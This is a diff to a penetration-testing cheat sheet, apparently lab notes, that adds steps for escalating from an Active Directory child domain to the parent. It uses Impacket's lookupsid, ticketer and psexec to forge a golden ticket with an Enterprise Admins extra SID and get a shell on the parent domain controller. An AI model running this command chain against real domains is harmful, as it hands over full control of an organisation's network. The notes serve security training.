@@ -66,4 +66,28 @@ Obtaining Domain SID via SID Bruteforcing by lookupsid.py:
 lookupsid.py <domainname>/<username>@<dcipforchild>
 ```
 
-Next, we obtain Enterprise Admin SID:
+Next, we obtain Enterprise Admin SID from parent domain:
+```
+lookupsid.py <domainname>/<username>@<dcipforparent> | grep -B12 "Enterprise Admins"
+```
+
+We then use impacket-ticketer to generate the golden ticket and this tool will save it as ccache file:
+```
+ticketer.py -nthash <krbtgthash> -domain <childdomainfqdn> -domain-sid <childomainsid> -extra-sid <enterpriseadminsid> NJohn
+```
+
+Setting the KRB5CCNAME env variable with the generated ccache:
+```
+export KRB5CCNAME=NJohn.ccache 
+```
+
+We then use impacket-psexec to connect to dc of parent domain:
+```
+psexec.py <childdomainname>/NJohn@a<parentdcname> -k -no-pass -target-ip <dcipforparent>
+#Example:
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+
+Automated Tooling:
+
+Thanks 
